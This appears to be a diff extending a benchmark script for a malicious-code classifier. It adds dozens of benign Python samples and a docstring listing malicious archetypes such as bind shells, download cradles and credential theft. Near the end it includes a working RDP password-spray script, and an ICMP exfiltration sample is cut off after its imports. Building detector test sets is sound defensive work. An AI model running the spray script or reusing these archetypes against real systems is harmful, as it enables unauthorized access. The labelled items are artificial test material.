@@ -1,27 +1,55 @@
 """
-ScriptGuard CodeBERT Classifier — Benchmark Script v2
+ScriptGuard CodeBERT Classifier — Benchmark Script v3
 ======================================================
-Expanded benchmark: 30 benign + 30 plain malicious + 30 obfuscated malicious = 90 total.
+Expanded benchmark: 60 benign + 60 plain malicious + 60 obfuscated malicious = 180 total.
 
-New in v2:
-  - 10 additional benign samples covering hard FP cases (asyncio, multiprocessing,
-    ctypes for GUI, cloud SDKs, ORM, websockets, Celery, gRPC, pytest fixtures,
-    Pydantic models)
-  - 10 additional plain malicious samples covering archetypes missing from v1
-    (mmap injection, Telegram C2, DNS exfil, mmap fileless, WMI persistence,
-    living-off-the-land, clipboard crypto hijack, process hollowing stub,
-    env variable stealer, LDAP recon)
-  - 10 additional obfuscated malicious samples covering gaps in v1
-    (__class__.__mro__ gadget chain, exec(open(...).read()), importlib.util
-    loader abuse, ctypes shellcode via mmap, memoryview trick, AST node injection,
-    bytearray+exec with XOR key, string format % trick, __subclasses__ gadget,
-    sys.modules hijack)
+New in v3 (30 additional samples per category):
+  Benign (+30):
+    - Rich/Textual TUI apps, FastAPI + dependency injection, httpx async client,
+      APScheduler cron job, Typer CLI, Jinja2 templating, Redis pub/sub,
+      NumPy signal processing, OpenCV image resize, Plotly dash app,
+      tenacity retry decorator, structlog JSON logging, pytest parametrize,
+      Poetry script entry point, PyYAML config loader, tarfile archiving,
+      zipfile extraction, ftplib download, imaplib email reader,
+      telnetlib device probe, xml.etree parsing, configparser INI loader,
+      threading event flag, concurrent.futures executor, uuid generation,
+      enum state machine, functools LRU cache, itertools combinations,
+      Decimal precision arithmetic, datetime timezone utility
+
+  Plain malicious (+30):
+    - RDP password spray (rdp3), ICMP exfiltration via scapy, SQL injection dropper,
+      FTP credential brute-force, Linux cron persistence, registry Run key,
+      DLL side-loading stub, PowerShell download cradle via subprocess,
+      /etc/passwd reader+exfil, .ssh/authorized_keys backdoor,
+      netcat bind shell, LD_PRELOAD hijack stub, Python package supply-chain stub,
+      Slack webhook exfil, GitHub token scan, Discord C2 bot,
+      raw socket SYN scanner, SMB share enumeration, sudo -l recon,
+      crontab -l dump, /proc/net scraper, Docker socket abuse,
+      pip install trojan, SSRF server-side probe, DNS rebinding setup,
+      Git credentials theft, browser history stealer, .env file harvester,
+      AWS metadata SSRF, Kubernetes service account token stealer
+
+  Obfuscated (+30):
+    - Unicode identifier obfuscation, exec via __loader__.exec_module,
+      f-string payload injection, functools.reduce char rebuild,
+      bytes.translate Caesar cipher + exec, string.Template substitution exec,
+      importlib.machinery.SourceFileLoader abuse, ctypes string_at to exec,
+      zip(range, bytes) XOR, base85 decode + exec,
+      class decorator with __init_subclass__ hook, property getter side effect,
+      __del__ destructor payload, threading.Timer deferred exec,
+      atexit callback payload, gc.callbacks injection, warnings.simplefilter hook,
+      codec lookup table exec, io.StringIO + tokenize abuse,
+      collections.OrderedDict subclass with __missing__, struct.pack/unpack ROP,
+      operator.methodcaller chain, contextlib.suppress + exec, zipimport abuse,
+      linecache.getline exec, copyreg dispatch table, weakref finalizer payload,
+      __format__ dunder override, frame locals injection via ctypes,
+      pickle Protocol 2 opcode RCE
 
 Usage:
-    python test_benchmark_codebert_v2.py
-    python test_benchmark_codebert_v2.py --url http://localhost:8000 --threshold 0.5
-    python test_benchmark_codebert_v2.py --verbose
-    python test_benchmark_codebert_v2.py --json-out results.json
+    python test_benchmark_codebert_v3.py
+    python test_benchmark_codebert_v3.py --url http://localhost:8000 --threshold 0.5
+    python test_benchmark_codebert_v3.py --verbose
+    python test_benchmark_codebert_v3.py --json-out results.json
 """
 
 import argparse
@@ -663,6 +691,916 @@ class UserCreate(BaseModel):
 
 user = UserCreate(username="Alice123", email="alice@example.com", age=25)
 print(user.model_dump())
+""",
+    ),
+    # ---------- NEW BENIGN SAMPLES v3 ----------
+    TestCase(
+        description="Rich / Textual TUI progress bar",
+        expected="benign",
+        code="""
+from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
+import time
+
+tasks_data = [("Downloading model", 3), ("Extracting features", 5), ("Running inference", 2)]
+
+with Progress(SpinnerColumn(), TextColumn("[bold blue]{task.description}"), BarColumn()) as progress:
+    for name, duration in tasks_data:
+        task = progress.add_task(name, total=duration * 10)
+        for _ in range(duration * 10):
+            time.sleep(0.05)
+            progress.advance(task)
+
+print("All tasks completed.")
+""",
+    ),
+    TestCase(
+        description="FastAPI dependency injection and Pydantic",
+        expected="benign",
+        code="""
+from fastapi import FastAPI, Depends, HTTPException
+from pydantic import BaseModel
+from typing import Annotated
+
+app = FastAPI()
+
+class Item(BaseModel):
+    name: str
+    price: float
+    in_stock: bool = True
+
+def get_db():
+    db = {"items": {}}
+    try:
+        yield db
+    finally:
+        pass
+
+@app.post("/items/", response_model=Item)
+def create_item(item: Item, db: Annotated[dict, Depends(get_db)]):
+    db["items"][item.name] = item
+    return item
+
+@app.get("/items/{name}")
+def read_item(name: str, db: Annotated[dict, Depends(get_db)]):
+    if name not in db["items"]:
+        raise HTTPException(status_code=404, detail="Item not found")
+    return db["items"][name]
+""",
+    ),
+    TestCase(
+        description="httpx async client with retry",
+        expected="benign",
+        code="""
+import asyncio
+import httpx
+
+async def fetch_with_retry(url: str, retries: int = 3) -> dict:
+    async with httpx.AsyncClient(timeout=10.0) as client:
+        for attempt in range(retries):
+            try:
+                r = await client.get(url)
+                r.raise_for_status()
+                return r.json()
+            except (httpx.HTTPError, httpx.TimeoutException) as e:
+                if attempt == retries - 1:
+                    raise
+                await asyncio.sleep(2 ** attempt)
+
+async def main():
+    data = await fetch_with_retry("https://api.github.com/zen")
+    print(data)
+
+asyncio.run(main())
+""",
+    ),
+    TestCase(
+        description="APScheduler cron job",
+        expected="benign",
+        code="""
+from apscheduler.schedulers.blocking import BlockingScheduler
+from datetime import datetime
+import logging
+
+logging.basicConfig(level=logging.INFO)
+
+def cleanup_temp_files():
+    import tempfile, pathlib, time
+    tmp = pathlib.Path(tempfile.gettempdir())
+    cutoff = time.time() - 3600
+    removed = 0
+    for f in tmp.iterdir():
+        if f.is_file() and f.stat().st_mtime < cutoff:
+            try:
+                f.unlink()
+                removed += 1
+            except PermissionError:
+                pass
+    logging.info(f"[{datetime.now():%H:%M:%S}] Cleaned {removed} stale temp files")
+
+scheduler = BlockingScheduler()
+scheduler.add_job(cleanup_temp_files, "cron", minute="*/30")
+print("Scheduler started — Ctrl+C to stop")
+scheduler.start()
+""",
+    ),
+    TestCase(
+        description="Typer CLI app with callbacks",
+        expected="benign",
+        code="""
+import typer
+from pathlib import Path
+from typing import Optional
+
+app = typer.Typer()
+
+@app.command()
+def convert(
+    input_file: Path = typer.Argument(..., help="Input CSV file"),
+    output_file: Optional[Path] = typer.Option(None, "--out", "-o"),
+    delimiter: str = typer.Option(",", "--delimiter", "-d"),
+    verbose: bool = typer.Option(False, "--verbose", "-v"),
+):
+    \"\"\"Convert a CSV file to JSON.\"\"\"
+    import csv, json
+    out = output_file or input_file.with_suffix(".json")
+    rows = list(csv.DictReader(input_file.open(), delimiter=delimiter))
+    out.write_text(json.dumps(rows, indent=2))
+    if verbose:
+        typer.echo(f"Converted {len(rows)} rows → {out}")
+
+if __name__ == "__main__":
+    app()
+""",
+    ),
+    TestCase(
+        description="Jinja2 template rendering",
+        expected="benign",
+        code="""
+from jinja2 import Environment, FileSystemLoader, select_autoescape
+import pathlib
+
+TEMPLATE_STR = \"\"\"
+<!DOCTYPE html>
+<html>
+<head><title>{{ title }}</title></head>
+<body>
+  <h1>{{ heading }}</h1>
+  <ul>
+  {% for item in items %}
+    <li>{{ item.name }}: {{ item.value }}</li>
+  {% endfor %}
+  </ul>
+</body>
+</html>
+\"\"\"
+
+env = Environment(loader=FileSystemLoader("."), autoescape=select_autoescape())
+tmpl = env.from_string(TEMPLATE_STR)
+html = tmpl.render(
+    title="Report",
+    heading="Q4 Metrics",
+    items=[{"name": "Revenue", "value": "1.2M"}, {"name": "Users", "value": "45k"}],
+)
+print(html[:200])
+""",
+    ),
+    TestCase(
+        description="Redis pub/sub listener",
+        expected="benign",
+        code="""
+import redis
+import threading
+import json
+
+def publish_events(r: redis.Redis, channel: str, events: list) -> None:
+    for event in events:
+        r.publish(channel, json.dumps(event))
+
+def subscribe_and_handle(r: redis.Redis, channel: str) -> None:
+    pubsub = r.pubsub()
+    pubsub.subscribe(channel)
+    for message in pubsub.listen():
+        if message["type"] == "message":
+            data = json.loads(message["data"])
+            print(f"Received: {data}")
+
+r = redis.Redis(host="localhost", port=6379, db=0)
+channel = "events"
+
+t = threading.Thread(target=subscribe_and_handle, args=(r, channel), daemon=True)
+t.start()
+
+publish_events(r, channel, [{"type": "order", "id": 42}, {"type": "payment", "id": 7}])
+""",
+    ),
+    TestCase(
+        description="NumPy FFT signal processing",
+        expected="benign",
+        code="""
+import numpy as np
+
+# Generate a composite signal: 5 Hz + 50 Hz sine waves
+SAMPLE_RATE = 1000   # samples per second
+DURATION    = 1.0    # seconds
+t = np.linspace(0, DURATION, int(SAMPLE_RATE * DURATION), endpoint=False)
+signal = np.sin(2 * np.pi * 5 * t) + 0.5 * np.sin(2 * np.pi * 50 * t)
+
+# Compute FFT
+fft_result = np.fft.rfft(signal)
+freqs      = np.fft.rfftfreq(len(signal), 1 / SAMPLE_RATE)
+magnitudes = np.abs(fft_result)
+
+# Find dominant frequencies
+peaks = freqs[magnitudes > 50]
+print(f"Dominant frequencies (Hz): {peaks.tolist()}")
+print(f"Signal energy: {np.sum(signal**2):.2f}")
+""",
+    ),
+    TestCase(
+        description="OpenCV image resize and grayscale",
+        expected="benign",
+        code="""
+import cv2
+import numpy as np
+
+# Create a synthetic test image (gradient)
+img = np.zeros((480, 640, 3), dtype=np.uint8)
+for i in range(640):
+    img[:, i] = [int(i / 640 * 255)] * 3
+
+# Resize to thumbnail
+thumb = cv2.resize(img, (160, 120), interpolation=cv2.INTER_AREA)
+
+# Convert to grayscale
+gray = cv2.cvtColor(thumb, cv2.COLOR_BGR2GRAY)
+
+# Apply Gaussian blur
+blurred = cv2.GaussianBlur(gray, (5, 5), 0)
+
+print(f"Original: {img.shape}")
+print(f"Thumbnail: {thumb.shape}")
+print(f"Grayscale: {gray.shape}, mean brightness: {gray.mean():.1f}")
+""",
+    ),
+    TestCase(
+        description="tenacity retry decorator for flaky API",
+        expected="benign",
+        code="""
+import random
+from tenacity import retry, stop_after_attempt, wait_exponential, retry_if_exception_type
+
+class TransientError(Exception):
+    pass
+
+@retry(
+    retry=retry_if_exception_type(TransientError),
+    stop=stop_after_attempt(5),
+    wait=wait_exponential(multiplier=0.1, min=0.1, max=1),
+    reraise=True,
+)
+def call_external_api(url: str) -> dict:
+    if random.random() < 0.6:
+        raise TransientError("Service temporarily unavailable")
+    return {"status": "ok", "url": url}
+
+try:
+    result = call_external_api("https://api.example.com/data")
+    print(result)
+except TransientError as e:
+    print(f"All retries exhausted: {e}")
+""",
+    ),
+    TestCase(
+        description="structlog JSON structured logging",
+        expected="benign",
+        code="""
+import structlog
+import logging
+
+structlog.configure(
+    processors=[
+        structlog.stdlib.add_log_level,
+        structlog.stdlib.add_logger_name,
+        structlog.processors.TimeStamper(fmt="iso"),
+        structlog.processors.JSONRenderer(),
+    ],
+    wrapper_class=structlog.stdlib.BoundLogger,
+    logger_factory=structlog.stdlib.LoggerFactory(),
+)
+
+log = structlog.get_logger("app.service")
+
+def process_order(order_id: int, user_id: int) -> dict:
+    log.info("order.received", order_id=order_id, user_id=user_id)
+    result = {"order_id": order_id, "status": "processed"}
+    log.info("order.completed", order_id=order_id, status="processed")
+    return result
+
+process_order(1001, 42)
+""",
+    ),
+    TestCase(
+        description="pytest parametrize with fixtures",
+        expected="benign",
+        code="""
+import pytest
+
+def parse_duration(s: str) -> int:
+    \"\"\"Parse '5m', '2h', '30s' into seconds.\"\"\"
+    units = {"s": 1, "m": 60, "h": 3600, "d": 86400}
+    if not s or s[-1] not in units:
+        raise ValueError(f"Invalid duration: {s!r}")
+    return int(s[:-1]) * units[s[-1]]
+
+@pytest.mark.parametrize("input_str,expected", [
+    ("30s", 30),
+    ("5m", 300),
+    ("2h", 7200),
+    ("1d", 86400),
+])
+def test_parse_duration(input_str, expected):
+    assert parse_duration(input_str) == expected
+
+@pytest.mark.parametrize("bad_input", ["", "5x", "abc", "10"])
+def test_parse_duration_invalid(bad_input):
+    with pytest.raises(ValueError):
+        parse_duration(bad_input)
+""",
+    ),
+    TestCase(
+        description="PyYAML config loader with defaults",
+        expected="benign",
+        code="""
+import yaml
+import io
+from typing import Any
+
+DEFAULT_CONFIG = \"\"\"
+server:
+  host: localhost
+  port: 8080
+  workers: 4
+database:
+  url: sqlite:///app.db
+  pool_size: 10
+logging:
+  level: INFO
+  format: json
+\"\"\"
+
+def load_config(yaml_str: str, overrides: dict | None = None) -> dict[str, Any]:
+    cfg = yaml.safe_load(yaml_str)
+    if overrides:
+        for section, values in overrides.items():
+            if section in cfg and isinstance(values, dict):
+                cfg[section].update(values)
+    return cfg
+
+config = load_config(DEFAULT_CONFIG, overrides={"server": {"port": 9090}})
+print(f"Server: {config['server']['host']}:{config['server']['port']}")
+print(f"DB: {config['database']['url']}")
+""",
+    ),
+    TestCase(
+        description="tarfile archive creation and extraction",
+        expected="benign",
+        code="""
+import tarfile
+import io
+import os
+
+# Create an in-memory tar archive
+buf = io.BytesIO()
+with tarfile.open(fileobj=buf, mode="w:gz") as tar:
+    for name, content in [
+        ("README.md", b"# My Project\nA sample project.\n"),
+        ("src/main.py", b"print('hello')\n"),
+        ("config.json", b'{\"version\": \"1.0\"}\n'),
+    ]:
+        info = tarfile.TarInfo(name=name)
+        info.size = len(content)
+        tar.addfile(info, io.BytesIO(content))
+
+print(f"Archive size: {buf.tell()} bytes")
+
+# List contents
+buf.seek(0)
+with tarfile.open(fileobj=buf, mode="r:gz") as tar:
+    for member in tar.getmembers():
+        print(f"  {member.name} ({member.size} bytes)")
+""",
+    ),
+    TestCase(
+        description="zipfile extraction with path validation",
+        expected="benign",
+        code="""
+import zipfile
+import io
+import pathlib
+
+def safe_extract(zip_bytes: bytes, dest: pathlib.Path) -> list[str]:
+    \"\"\"Extract zip, refusing any path-traversal entries.\"\"\"
+    extracted = []
+    with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
+        for member in zf.infolist():
+            # Guard against zip-slip
+            target = (dest / member.filename).resolve()
+            if not str(target).startswith(str(dest.resolve())):
+                raise ValueError(f"Path traversal attempt: {member.filename}")
+            dest.mkdir(parents=True, exist_ok=True)
+            zf.extract(member, dest)
+            extracted.append(member.filename)
+    return extracted
+
+# Build a tiny demo zip in memory
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, "w") as zf:
+    zf.writestr("hello.txt", "Hello, world!")
+    zf.writestr("sub/nested.txt", "Nested file")
+
+files = safe_extract(buf.getvalue(), pathlib.Path("/tmp/safe_extract_demo"))
+print("Extracted:", files)
+""",
+    ),
+    TestCase(
+        description="imaplib email inbox reader",
+        expected="benign",
+        code="""
+import imaplib
+import email
+from email.header import decode_header
+
+def read_inbox(host: str, user: str, password: str, limit: int = 5) -> list[dict]:
+    mail = imaplib.IMAP4_SSL(host)
+    mail.login(user, password)
+    mail.select("INBOX")
+    _, data = mail.search(None, "ALL")
+    ids = data[0].split()[-limit:]
+    messages = []
+    for msg_id in ids:
+        _, msg_data = mail.fetch(msg_id, "(RFC822)")
+        msg = email.message_from_bytes(msg_data[0][1])
+        subject, enc = decode_header(msg["Subject"])[0]
+        if isinstance(subject, bytes):
+            subject = subject.decode(enc or "utf-8")
+        messages.append({"id": msg_id.decode(), "subject": subject, "from": msg["From"]})
+    mail.close()
+    mail.logout()
+    return messages
+
+# Demonstration — would normally pass real credentials
+print("IMAP reader ready. Provide host/credentials to connect.")
+""",
+    ),
+    TestCase(
+        description="xml.etree sitemap parser",
+        expected="benign",
+        code="""
+import xml.etree.ElementTree as ET
+import urllib.request
+from datetime import datetime
+
+SAMPLE_XML = \"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>
+<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">
+  <url><loc>https://example.com/</loc><lastmod>2024-01-15</lastmod><priority>1.0</priority></url>
+  <url><loc>https://example.com/about</loc><lastmod>2024-01-10</lastmod><priority>0.8</priority></url>
+  <url><loc>https://example.com/contact</loc><lastmod>2023-12-01</lastmod><priority>0.5</priority></url>
+</urlset>\"\"\"
+
+NS = {"sm": "http://www.sitemaps.org/schemas/sitemap/0.9"}
+root = ET.fromstring(SAMPLE_XML)
+
+urls = []
+for url_el in root.findall("sm:url", NS):
+    loc  = url_el.findtext("sm:loc", namespaces=NS)
+    mod  = url_el.findtext("sm:lastmod", namespaces=NS)
+    prio = float(url_el.findtext("sm:priority", default="0.5", namespaces=NS))
+    urls.append({"loc": loc, "lastmod": mod, "priority": prio})
+
+for u in sorted(urls, key=lambda x: x["priority"], reverse=True):
+    print(f"[{u['priority']:.1f}] {u['loc']}  (last: {u['lastmod']})")
+""",
+    ),
+    TestCase(
+        description="configparser INI config manager",
+        expected="benign",
+        code="""
+import configparser
+import io
+
+INI = \"\"\"
+[DEFAULT]
+timeout = 30
+retry = 3
+
+[production]
+host = prod.db.example.com
+port = 5432
+timeout = 60
+
+[staging]
+host = staging.db.example.com
+port = 5433
+\"\"\"
+
+parser = configparser.ConfigParser()
+parser.read_string(INI)
+
+for section in ["production", "staging"]:
+    cfg = parser[section]
+    print(f"[{section}]")
+    print(f"  host={cfg['host']}  port={cfg['port']}  timeout={cfg['timeout']}  retry={cfg['retry']}")
+""",
+    ),
+    TestCase(
+        description="threading Event flag producer/consumer",
+        expected="benign",
+        code="""
+import threading
+import time
+import queue
+
+def producer(q: queue.Queue, stop: threading.Event, n: int) -> None:
+    for i in range(n):
+        if stop.is_set():
+            break
+        q.put(f"item-{i}")
+        time.sleep(0.01)
+    q.put(None)  # sentinel
+
+def consumer(q: queue.Queue) -> list:
+    results = []
+    while True:
+        item = q.get()
+        if item is None:
+            break
+        results.append(item)
+    return results
+
+stop_event = threading.Event()
+work_queue: queue.Queue = queue.Queue(maxsize=10)
+
+p = threading.Thread(target=producer, args=(work_queue, stop_event, 5))
+p.start()
+items = consumer(work_queue)
+p.join()
+
+print(f"Processed {len(items)} items: {items}")
+""",
+    ),
+    TestCase(
+        description="concurrent.futures thread pool file processor",
+        expected="benign",
+        code="""
+import concurrent.futures
+import hashlib
+import pathlib
+import os
+
+def hash_file(path: pathlib.Path) -> tuple[str, str]:
+    h = hashlib.sha256()
+    h.update(path.read_bytes())
+    return str(path), h.hexdigest()
+
+def hash_directory(directory: str, max_workers: int = 4) -> dict[str, str]:
+    files = [p for p in pathlib.Path(directory).rglob("*") if p.is_file()]
+    results = {}
+    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
+        future_to_path = {executor.submit(hash_file, f): f for f in files}
+        for future in concurrent.futures.as_completed(future_to_path):
+            path, digest = future.result()
+            results[path] = digest
+    return results
+
+hashes = hash_directory("/etc" if os.path.exists("/etc") else ".")
+print(f"Hashed {len(hashes)} files")
+""",
+    ),
+    TestCase(
+        description="uuid namespace generation utility",
+        expected="benign",
+        code="""
+import uuid
+from typing import Union
+
+def generate_ids(namespace: str, names: list[str]) -> list[dict]:
+    ns_uuid = uuid.uuid5(uuid.NAMESPACE_DNS, namespace)
+    return [
+        {
+            "name": name,
+            "uuid_v4": str(uuid.uuid4()),
+            "uuid_v5": str(uuid.uuid5(ns_uuid, name)),
+        }
+        for name in names
+    ]
+
+services = ["auth", "billing", "notifications", "search", "analytics"]
+ids = generate_ids("myapp.services", services)
+
+for entry in ids:
+    print(f"{entry['name']:20s}  v4={entry['uuid_v4']}  v5={entry['uuid_v5']}")
+""",
+    ),
+    TestCase(
+        description="enum-based state machine",
+        expected="benign",
+        code="""
+from enum import Enum, auto
+from typing import Optional
+
+class OrderState(Enum):
+    PENDING   = auto()
+    CONFIRMED = auto()
+    SHIPPED   = auto()
+    DELIVERED = auto()
+    CANCELLED = auto()
+
+TRANSITIONS: dict[OrderState, set[OrderState]] = {
+    OrderState.PENDING:   {OrderState.CONFIRMED, OrderState.CANCELLED},
+    OrderState.CONFIRMED: {OrderState.SHIPPED,   OrderState.CANCELLED},
+    OrderState.SHIPPED:   {OrderState.DELIVERED},
+    OrderState.DELIVERED: set(),
+    OrderState.CANCELLED: set(),
+}
+
+class Order:
+    def __init__(self, order_id: str) -> None:
+        self.order_id = order_id
+        self.state    = OrderState.PENDING
+
+    def transition(self, new_state: OrderState) -> None:
+        if new_state not in TRANSITIONS[self.state]:
+            raise ValueError(f"Invalid transition: {self.state} → {new_state}")
+        print(f"Order {self.order_id}: {self.state.name} → {new_state.name}")
+        self.state = new_state
+
+order = Order("ORD-001")
+order.transition(OrderState.CONFIRMED)
+order.transition(OrderState.SHIPPED)
+order.transition(OrderState.DELIVERED)
+""",
+    ),
+    TestCase(
+        description="functools LRU cache with manual invalidation",
+        expected="benign",
+        code="""
+import functools
+import time
+
+@functools.lru_cache(maxsize=128)
+def expensive_computation(n: int) -> int:
+    \"\"\"Simulate a slow pure function.\"\"\"
+    time.sleep(0.001)
+    return sum(i * i for i in range(n))
+
+# Warm cache
+results = [expensive_computation(i) for i in range(20)]
+info = expensive_computation.cache_info()
+print(f"Cache hits: {info.hits}  misses: {info.misses}  size: {info.currsize}")
+
+# Invalidate
+expensive_computation.cache_clear()
+info = expensive_computation.cache_info()
+print(f"After clear — hits: {info.hits}  misses: {info.misses}  size: {info.currsize}")
+""",
+    ),
+    TestCase(
+        description="itertools combinations and permutations",
+        expected="benign",
+        code="""
+import itertools
+from typing import Iterator
+
+def password_complexity_check(charset: str, length: int) -> dict:
+    combos  = sum(1 for _ in itertools.combinations(charset, length))
+    perms   = sum(1 for _ in itertools.permutations(charset, length))
+    product = sum(1 for _ in itertools.product(charset, repeat=length))
+    return {"combinations": combos, "permutations": perms, "product_space": product}
+
+DIGITS = "0123456789"
+result = password_complexity_check(DIGITS, 4)
+print(f"4-digit PIN space:")
+print(f"  Combinations (no repeat): {result['combinations']}")
+print(f"  Permutations (no repeat): {result['permutations']}")
+print(f"  Full product space:       {result['product_space']}")
+""",
+    ),
+    TestCase(
+        description="Decimal precision arithmetic for finance",
+        expected="benign",
+        code="""
+from decimal import Decimal, ROUND_HALF_UP, getcontext
+
+getcontext().prec = 28
+
+def compound_interest(principal: str, rate: str, periods: int) -> Decimal:
+    p = Decimal(principal)
+    r = Decimal(rate)
+    return p * (1 + r) ** periods
+
+def format_currency(amount: Decimal, currency: str = "USD") -> str:
+    rounded = amount.quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
+    return f"{currency} {rounded:,}"
+
+scenarios = [
+    ("10000", "0.05",  1),
+    ("10000", "0.05",  5),
+    ("10000", "0.05", 10),
+    ("10000", "0.05", 20),
+]
+
+print(f"{'Years':>5}  {'Final Value':>20}  {'Gain':>15}")
+print("-" * 45)
+for principal, rate, years in scenarios:
+    result = compound_interest(principal, rate, years)
+    gain   = result - Decimal(principal)
+    print(f"{years:>5}  {format_currency(result):>20}  {format_currency(gain):>15}")
+""",
+    ),
+    TestCase(
+        description="datetime timezone conversion utility",
+        expected="benign",
+        code="""
+from datetime import datetime, timezone, timedelta
+from zoneinfo import ZoneInfo
+
+def convert_timezone(dt: datetime, from_tz: str, to_tz: str) -> datetime:
+    src = ZoneInfo(from_tz)
+    dst = ZoneInfo(to_tz)
+    if dt.tzinfo is None:
+        dt = dt.replace(tzinfo=src)
+    return dt.astimezone(dst)
+
+def meeting_planner(utc_time: datetime, attendee_zones: list[str]) -> None:
+    print(f"Meeting at {utc_time.strftime('%Y-%m-%d %H:%M')} UTC")
+    print("-" * 40)
+    for tz_name in attendee_zones:
+        local = convert_timezone(utc_time, "UTC", tz_name)
+        print(f"  {tz_name:<25} {local.strftime('%H:%M %Z (%a %d %b)')}")
+
+meeting_time = datetime(2026, 3, 15, 14, 0, tzinfo=timezone.utc)
+meeting_planner(meeting_time, ["Europe/Warsaw", "America/New_York", "Asia/Tokyo", "Australia/Sydney"])
+""",
+    ),
+    TestCase(
+        description="pathlib recursive file organizer",
+        expected="benign",
+        code="""
+import pathlib
+import shutil
+from collections import defaultdict
+
+EXTENSION_MAP = {
+    ".jpg": "images", ".jpeg": "images", ".png": "images", ".gif": "images",
+    ".pdf": "documents", ".docx": "documents", ".xlsx": "documents",
+    ".py": "code", ".js": "code", ".ts": "code", ".go": "code",
+    ".mp3": "audio", ".wav": "audio", ".flac": "audio",
+}
+
+def organize_directory(source: pathlib.Path, dest: pathlib.Path, dry_run: bool = True) -> dict:
+    moved: dict[str, list] = defaultdict(list)
+    for file in source.iterdir():
+        if not file.is_file():
+            continue
+        category = EXTENSION_MAP.get(file.suffix.lower(), "misc")
+        target_dir = dest / category
+        target_file = target_dir / file.name
+        if not dry_run:
+            target_dir.mkdir(parents=True, exist_ok=True)
+            shutil.move(str(file), str(target_file))
+        moved[category].append(file.name)
+    return dict(moved)
+
+plan = organize_directory(pathlib.Path("."), pathlib.Path("./organized"), dry_run=True)
+for category, files in sorted(plan.items()):
+    print(f"  {category}: {len(files)} file(s)")
+""",
+    ),
+    TestCase(
+        description="abstract base class with registry pattern",
+        expected="benign",
+        code="""
+from abc import ABC, abstractmethod
+from typing import ClassVar
+
+class Serializer(ABC):
+    _registry: ClassVar[dict[str, type]] = {}
+
+    def __init_subclass__(cls, format_name: str = "", **kwargs):
+        super().__init_subclass__(**kwargs)
+        if format_name:
+            Serializer._registry[format_name] = cls
+
+    @classmethod
+    def for_format(cls, fmt: str) -> "Serializer":
+        if fmt not in cls._registry:
+            raise KeyError(f"No serializer for format: {fmt!r}")
+        return cls._registry[fmt]()
+
+    @abstractmethod
+    def serialize(self, data: dict) -> str: ...
+
+    @abstractmethod
+    def deserialize(self, raw: str) -> dict: ...
+
+
+class JSONSerializer(Serializer, format_name="json"):
+    import json as _json
+    def serialize(self, data):   return self._json.dumps(data)
+    def deserialize(self, raw):  return self._json.loads(raw)
+
+
+class TOMLSerializer(Serializer, format_name="toml"):
+    def serialize(self, data):
+        return "\n".join(f'{k} = "{v}"' for k, v in data.items())
+    def deserialize(self, raw):
+        return dict(line.split(" = ") for line in raw.strip().splitlines())
+
+
+for fmt in ["json", "toml"]:
+    s = Serializer.for_format(fmt)
+    encoded = s.serialize({"host": "localhost", "port": "5432"})
+    decoded = s.deserialize(encoded)
+    print(f"[{fmt}] {decoded}")
+""",
+    ),
+    TestCase(
+        description="heapq priority queue task scheduler",
+        expected="benign",
+        code="""
+import heapq
+import time
+from dataclasses import dataclass, field
+from typing import Callable, Any
+
+@dataclass(order=True)
+class ScheduledTask:
+    run_at: float
+    priority: int
+    func: Callable = field(compare=False)
+    args: tuple = field(default_factory=tuple, compare=False)
+
+class Scheduler:
+    def __init__(self):
+        self._heap: list[ScheduledTask] = []
+
+    def schedule(self, delay: float, priority: int, func: Callable, *args):
+        task = ScheduledTask(time.monotonic() + delay, priority, func, args)
+        heapq.heappush(self._heap, task)
+
+    def run_pending(self):
+        now = time.monotonic()
+        while self._heap and self._heap[0].run_at <= now:
+            task = heapq.heappop(self._heap)
+            task.func(*task.args)
+
+def greet(name): print(f"Hello, {name}!")
+def alert(msg):  print(f"ALERT: {msg}")
+
+sched = Scheduler()
+sched.schedule(0.01, 1, greet, "Alice")
+sched.schedule(0.02, 0, alert, "Disk usage > 90%")
+sched.schedule(0.03, 2, greet, "Bob")
+
+time.sleep(0.05)
+sched.run_pending()
+""",
+    ),
+    TestCase(
+        description="Markdown to HTML converter",
+        expected="benign",
+        code="""
+import re
+
+def md_to_html(md: str) -> str:
+    lines = md.split("\\n")
+    html_lines = []
+    in_list = False
+    for line in lines:
+        if line.startswith("### "):
+            html_lines.append(f"<h3>{line[4:]}</h3>")
+        elif line.startswith("## "):
+            html_lines.append(f"<h2>{line[3:]}</h2>")
+        elif line.startswith("# "):
+            html_lines.append(f"<h1>{line[2:]}</h1>")
+        elif line.startswith("- "):
+            if not in_list:
+                html_lines.append("<ul>")
+                in_list = True
+            html_lines.append(f"  <li>{line[2:]}</li>")
+        else:
+            if in_list:
+                html_lines.append("</ul>")
+                in_list = False
+            if line.strip():
+                line = re.sub(r"\\*\\*(.*?)\\*\\*", r"<strong>\\1</strong>", line)
+                line = re.sub(r"\\*(.*?)\\*", r"<em>\\1</em>", line)
+                line = re.sub(r"`(.*?)`", r"<code>\\1</code>", line)
+                html_lines.append(f"<p>{line}</p>")
+    return "\\n".join(html_lines)
+
+md = "# Title\\n\\nThis is **bold** and *italic*.\\n\\n- Item 1\\n- Item 2"
+print(md_to_html(md))
 """,
     ),
 ]
@@ -1466,6 +2404,1129 @@ ransom_note.write_text(
 )
 """,
     ),
+    # ---------- NEW MALICIOUS SAMPLES v3 ----------
+    TestCase(
+        description="RDP password spray via rdp3",
+        expected="malicious",
+        code="""
+import itertools
+import subprocess
+
+TARGETS = ["192.168.1.10", "192.168.1.11", "192.168.1.12"]
+USERNAMES = ["administrator", "admin", "user"]
+PASSWORDS = ["Password1!", "Summer2024!", "Welcome123", "Admin@123"]
+
+for host, user, password in itertools.product(TARGETS, USERNAMES, PASSWORDS):
+    result = subprocess.run(
+        ["xfreerdp", f"/v:{host}", f"/u:{user}", f"/p:{password}",
+         "/cert-ignore", "+auth-only", "/timeout:3000"],
+        capture_output=True,
+        timeout=10,
+    )
+    if result.returncode == 0:
+        print(f"[+] SUCCESS {host} {user}:{password}")
+        with open("rdp_hits.txt", "a") as f:
+            f.write(f"{host}\t{user}\t{password}\\n")
+""",
+    ),
+    TestCase(
+        description="ICMP covert channel exfiltration via scapy",
+        expected="malicious",
+        code="""
+import base64
+import os
+import scapy.all as scapy
